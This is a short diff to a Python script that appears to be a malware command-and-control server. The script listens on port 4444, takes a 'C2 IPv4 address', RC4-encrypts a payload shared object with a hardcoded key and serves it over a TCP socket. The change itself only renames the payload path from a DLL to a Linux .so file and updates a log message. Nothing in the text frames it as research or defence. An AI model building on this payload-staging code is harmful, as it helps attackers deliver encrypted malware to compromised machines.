@@ -7,14 +7,14 @@ import argparse
 
 HOST = "0.0.0.0"
 PORT = 4444
-DLL_PATH = "payload_linux.so"
+SO_PATH = "payload_linux.so"
 
 PACKET_FORMAT = "<BHI 256s"
 
 parser = argparse.ArgumentParser()
 parser.add_argument('--ip', help='C2 IPv4 address', type=str, default=HOST)
 parser.add_argument('-p', '--port', help='C2 port', type=int, default=PORT)
-parser.add_argument('--payload', help='File path of the DLL payload', type=str, default=DLL_PATH)
+parser.add_argument('--payload', help='File path of the DLL payload', type=str, default=SO_PATH)
 
 args = parser.parse_args()
 
@@ -78,7 +78,7 @@ def main():
     dll_bytes = rc4_crypt(b'RC4', dll_bytes)
 
     dll_len = len(dll_bytes)
-    print(f"[*] Loaded payload.dll: {dll_len} bytes")
+    print(f"[*] Loaded payload_linux.so: {dll_len} bytes")
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
         srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
